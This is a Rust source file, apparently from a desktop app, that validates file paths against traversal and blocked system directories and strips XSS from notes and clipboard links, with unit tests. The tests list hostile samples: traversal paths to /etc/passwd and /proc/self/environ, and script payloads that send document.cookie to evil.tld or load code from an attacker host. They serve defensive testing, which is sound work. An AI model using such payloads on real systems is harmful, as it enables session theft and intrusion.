use crate::core_domain::SecurityError;
use serde::{Deserialize, Serialize};

pub const MAX_PATH_LENGTH: usize = 4096;
pub const MAX_COMPONENT_LENGTH: usize = 255;

const WINDOWS_RESERVED_NAMES: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

const FORBIDDEN_SYSTEM_PREFIXES: &[&str] = &[
    "/etc",
    "/proc",
    "/sys",
    "/dev",
    "/boot",
    "/root",
    "/system/library",
    "/private/etc",
    "c:/windows",
    "c:/program files",
    "c:/program files (x86)",
    "c:/system volume information",
];

/// A path that has passed `PathSanitizer` validation and scope checks.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ValidatedPath {
    pub normalized: String,
}

/// `PathSanitizer` enforces path traversal prevention, null-byte rejection,
/// OS device name guards, and authorized root scope checks across Windows, macOS, and Linux.
pub struct PathSanitizer;

impl PathSanitizer {
    pub fn validate(
        raw_path: &str,
        allowed_roots: Option<&[String]>,
    ) -> Result<ValidatedPath, SecurityError> {
        if raw_path
            .chars()
            .any(|ch| ch == '\0' || (ch as u32) <= 0x1F || (ch as u32) == 0x7F)
        {
            return Err(SecurityError::ControlOrNullByteDetected);
        }

        let trimmed = raw_path.trim();
        if trimmed.is_empty() {
            return Err(SecurityError::EmptyPath);
        }

        if trimmed.chars().count() > MAX_PATH_LENGTH {
            return Err(SecurityError::PathTooLong {
                max: MAX_PATH_LENGTH,
            });
        }

        let lower_raw = trimmed.to_ascii_lowercase();
        if lower_raw.contains("%2e")
            || lower_raw.contains("%2f")
            || lower_raw.contains("%5c")
            || lower_raw.contains("%00")
        {
            return Err(SecurityError::EncodedTraversalDetected);
        }

        if trimmed.starts_with("\\\\") || trimmed.starts_with("//") {
            return Err(SecurityError::UncNetworkPathRejected);
        }

        let normalized_slashes = trimmed.replace('\\', "/");
        let segments: Vec<&str> = normalized_slashes
            .split('/')
            .filter(|seg| !seg.is_empty())
            .collect();

        if segments.is_empty() {
            return Err(SecurityError::EmptyPath);
        }

        for (idx, seg) in segments.iter().enumerate() {
            if *seg == "." || *seg == ".." || seg.contains("..") {
                return Err(SecurityError::PathTraversalDetected);
            }

            if seg.chars().count() > MAX_COMPONENT_LENGTH {
                return Err(SecurityError::ComponentTooLong {
                    max: MAX_COMPONENT_LENGTH,
                });
            }

            let is_drive_prefix = idx == 0
                && seg.len() == 2
                && seg.as_bytes()[0].is_ascii_alphabetic()
                && seg.as_bytes()[1] == b':';

            if !is_drive_prefix {
                let stem = seg.split('.').next().unwrap_or("").to_ascii_uppercase();
                if WINDOWS_RESERVED_NAMES.contains(&stem.as_str()) {
                    return Err(SecurityError::ReservedDeviceName { name: stem });
                }
            }
        }

        let collapsed = if normalized_slashes.starts_with('/') {
            format!("/{}", segments.join("/"))
        } else {
            segments.join("/")
        };

        let canonical_lower = collapsed.to_lowercase();
        for prefix in FORBIDDEN_SYSTEM_PREFIXES {
            if canonical_lower == *prefix || canonical_lower.starts_with(&format!("{prefix}/")) {
                return Err(SecurityError::SystemDirectoryForbidden);
            }
        }

        if let Some(roots) = allowed_roots {
            if !roots.is_empty() {
                let mut matched_root = false;
                for root in roots {
                    let norm_root = root
                        .trim()
                        .replace('\\', "/")
                        .trim_end_matches('/')
                        .to_lowercase();
                    if norm_root.is_empty() {
                        continue;
                    }
                    if canonical_lower == norm_root
                        || canonical_lower.starts_with(&format!("{norm_root}/"))
                    {
                        matched_root = true;
                        break;
                    }
                }

                if !matched_root {
                    return Err(SecurityError::OutsideAuthorizedScope);
                }
            }
        }

        Ok(ValidatedPath {
            normalized: collapsed,
        })
    }
}

/// `CommandGate` sanitizes text notes, task titles, and clipboard links against XSS and script injection.
pub struct CommandGate;

const DANGEROUS_BLOCK_TAGS: &[&str] = &[
    "script", "iframe", "object", "embed", "style", "svg", "math", "applet", "frame", "frameset",
];

impl CommandGate {
    /// Sanitizes user/clipboard text by removing `<script>` and other executable blocks,
    /// stripping HTML tags, removing inline `on*=` event handlers, and neutralizing
    /// dangerous protocol schemes (`javascript:`, `vbscript:`, `data:text/html`)
    /// while preserving clean Arabic and English text, numbers, and punctuation.
    pub fn sanitize_text_payload(raw: &str) -> String {
        if raw.is_empty() {
            return String::new();
        }

        let mut cleaned = raw.replace('\0', "");

        for tag in DANGEROUS_BLOCK_TAGS {
            cleaned = strip_paired_tag_case_insensitive(&cleaned, tag);
        }

        cleaned = strip_remaining_html_tags(&cleaned);
        cleaned = strip_inline_event_handlers(&cleaned);
        cleaned = strip_dangerous_protocols(&cleaned);

        cleaned.trim().to_string()
    }

    /// Validates a clipboard or quick-capture URI, allowing only `https://` and `http://`.
    pub fn sanitize_clipboard_uri(raw_uri: &str) -> Result<String, SecurityError> {
        let trimmed = raw_uri.trim();
        if trimmed.is_empty() || trimmed.contains('\0') {
            return Err(SecurityError::DangerousUriScheme);
        }

        let lower = trimmed.to_ascii_lowercase();
        if !(lower.starts_with("https://") || lower.starts_with("http://")) {
            return Err(SecurityError::DangerousUriScheme);
        }

        let after_scheme = if lower.starts_with("https://") {
            &trimmed[8..]
        } else {
            &trimmed[7..]
        };

        if after_scheme.is_empty()
            || after_scheme.starts_with('/')
            || after_scheme.chars().any(char::is_whitespace)
        {
            return Err(SecurityError::DangerousUriScheme);
        }

        Ok(trimmed.to_string())
    }
}

fn strip_paired_tag_case_insensitive(input: &str, tag: &str) -> String {
    let mut current = input.to_string();
    let open_pat = format!("<{tag}");
    let close_pat = format!("</{tag}");

    loop {
        let lower = current.to_ascii_lowercase();
        let Some(start_idx) = lower.find(&open_pat) else {
            break;
        };

        // Ensure the character immediately after `<tag` is whitespace, `>`, or `/`
        let after_open = start_idx + open_pat.len();
        if after_open < lower.len() {
            let next_byte = lower.as_bytes()[after_open];
            if !next_byte.is_ascii_whitespace() && next_byte != b'>' && next_byte != b'/' {
                break;
            }
        }

        if let Some(rel_close) = lower[after_open..].find(&close_pat) {
            let close_start = after_open + rel_close;
            if let Some(rel_end_gt) = lower[close_start..].find('>') {
                let remove_end = close_start + rel_end_gt + 1;
                current.replace_range(start_idx..remove_end, "");
                continue;
            }
        }

        // If unclosed `<script...`, remove up to the next `>` or end of string
        if let Some(rel_gt) = lower[start_idx..].find('>') {
            current.replace_range(start_idx..(start_idx + rel_gt + 1), "");
        } else {
            current.replace_range(start_idx..current.len(), "");
        }
    }

    current
}

fn strip_remaining_html_tags(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let chars: Vec<char> = input.chars().collect();
    let mut i = 0;

    while i < chars.len() {
        if chars[i] == '<' {
            let next = chars.get(i + 1).copied();
            let looks_like_tag = matches!(
                next,
                Some(ch) if ch.is_ascii_alphabetic() || ch == '/' || ch == '!' || ch == '?'
            );
            if looks_like_tag {
                let mut end = i + 1;
                while end < chars.len() && chars[end] != '>' {
                    end += 1;
                }
                if end < chars.len() && chars[end] == '>' {
                    i = end + 1;
                    continue;
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }

    out
}

fn strip_inline_event_handlers(input: &str) -> String {
    let tokens: Vec<&str> = input.split(' ').collect();
    let mut kept = Vec::with_capacity(tokens.len());

    for token in tokens {
        let lower = token.to_ascii_lowercase();
        let trimmed_lower = lower.trim_start_matches(|c: char| !c.is_ascii_alphabetic());
        if trimmed_lower.starts_with("on") && trimmed_lower.contains('=') {
            let event_name = trimmed_lower.split('=').next().unwrap_or("");
            if event_name.len() > 2 && event_name.chars().all(|c| c.is_ascii_alphabetic()) {
                continue;
            }
        }
        kept.push(token);
    }

    kept.join(" ")
}

fn strip_dangerous_protocols(input: &str) -> String {
    let tokens: Vec<&str> = input.split(' ').collect();
    let mut kept = Vec::with_capacity(tokens.len());

    for token in tokens {
        let lower = token.to_ascii_lowercase();
        if lower.contains("javascript:")
            || lower.contains("vbscript:")
            || lower.contains("data:text/html")
        {
            continue;
        }
        kept.push(token);
    }

    kept.join(" ")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rejects_path_traversal_variants() {
        let malicious_paths = [
            "../../etc/passwd",
            "..\\Windows\\System32",
            "../secret.txt",
            "/Users/rawaq/Desktop/../../../etc/shadow",
            "C:\\Users\\Ahmad\\Desktop\\..\\..\\Windows\\System32\\cmd.exe",
            "folder/..%2f..%2fetc/passwd",
            "folder/%2e%2e/secret",
            "folder\\..%5c..\\secret",
            "valid_name\0.txt",
            "C:\\Users\\Ahmad\\Desktop\\file\x07.pdf",
            "\\\\evil-server\\share\\payload.exe",
            "//evil-server/share/payload.exe",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "/etc/passwd",
            "/proc/self/environ",
            "C:\\Users\\Ahmad\\Desktop\\CON.txt",
            "C:\\Users\\Ahmad\\Desktop\\NUL",
            "   ",
            "",
        ];

        for bad in malicious_paths {
            let result = PathSanitizer::validate(bad, None);
            assert!(
                result.is_err(),
                "Expected malicious path '{bad}' to be rejected, but got: {result:?}"
            );
        }

        // Also test overlong component (> 255 chars) and overlong path (> 4096 chars)
        let long_component = format!("/Users/rawaq/{}/file.txt", "أ".repeat(260));
        assert_eq!(
            PathSanitizer::validate(&long_component, None),
            Err(SecurityError::ComponentTooLong {
                max: MAX_COMPONENT_LENGTH
            })
        );

        let long_path = format!("/Users/rawaq{}", "/مجلد_فرعي".repeat(450));
        assert_eq!(
            PathSanitizer::validate(&long_path, None),
            Err(SecurityError::PathTooLong {
                max: MAX_PATH_LENGTH
            })
        );
    }

    #[test]
    fn test_accepts_valid_arabic_and_english_paths_within_scope() {
        let allowed_roots = vec![
            "C:/Users/أحمد/Desktop".to_string(),
            "/home/salma/Desktop".to_string(),
        ];

        let valid_ar = PathSanitizer::validate(
            "C:\\Users\\أحمد\\Desktop\\مشاريع_2026\\تقرير_Rawaq_النهائي (1).pdf",
            Some(&allowed_roots),
        )
        .expect("Arabic/English mixed path inside authorized root should succeed");
        assert_eq!(
            valid_ar.normalized,
            "C:/Users/أحمد/Desktop/مشاريع_2026/تقرير_Rawaq_النهائي (1).pdf"
        );

        let out_of_scope =
            PathSanitizer::validate("/home/salma/Downloads/secret.pdf", Some(&allowed_roots));
        assert_eq!(out_of_scope, Err(SecurityError::OutsideAuthorizedScope));
    }

    #[test]
    fn test_sanitizes_html_and_script_payloads() {
        let cases = [
            (
                "ملاحظة هامة <script>fetch('https://evil.tld?c='+document.cookie)</script> للمشروع",
                "ملاحظة هامة  للمشروع",
            ),
            (
                "<img src=\"x\" onerror=\"alert(1)\" />عنوان المهمة اليومية",
                "عنوان المهمة اليومية",
            ),
            (
                "<ScRiPt src='http://attacker/xss.js'></sCrIpT>تقرير 2026 النهائي",
                "تقرير 2026 النهائي",
            ),
            (
                "<svg onload=\"alert(document.domain)\"><circle /></svg>مهمة رقم #42 (RTL & LTR)",
                "مهمة رقم #42 (RTL & LTR)",
            ),
            (
                "اضغط هنا javascript:alert(1) أو onerror=alert(2) للمتابعة",
                "اضغط هنا أو للمتابعة",
            ),
            (
                "نص عربي سليم 100% مع English words وأرقام (2026) — بدون أي كود خبيث!",
                "نص عربي سليم 100% مع English words وأرقام (2026) — بدون أي كود خبيث!",
            ),
        ];

        for (raw, expected) in cases {
            let cleaned = CommandGate::sanitize_text_payload(raw);
            assert_eq!(cleaned, expected);
            let lower = cleaned.to_ascii_lowercase();
            assert!(!lower.contains("<script"));
            assert!(!lower.contains("onerror="));
            assert!(!lower.contains("onload="));
            assert!(!lower.contains("javascript:"));
        }
    }

    #[test]
    fn test_clipboard_uri_sanitizer_blocks_dangerous_schemes() {
        assert_eq!(
            CommandGate::sanitize_clipboard_uri("javascript:alert(1)"),
            Err(SecurityError::DangerousUriScheme)
        );
        assert_eq!(
            CommandGate::sanitize_clipboard_uri("data:text/html,<script>alert(1)</script>"),
            Err(SecurityError::DangerousUriScheme)
        );
        assert_eq!(
            CommandGate::sanitize_clipboard_uri("file:///etc/passwd"),
            Err(SecurityError::DangerousUriScheme)
        );
        assert_eq!(
            CommandGate::sanitize_clipboard_uri("https://github.com/Heisen-lab/Rawaq-desk"),
            Ok("https://github.com/Heisen-lab/Rawaq-desk".to_string())
        );
    }
}
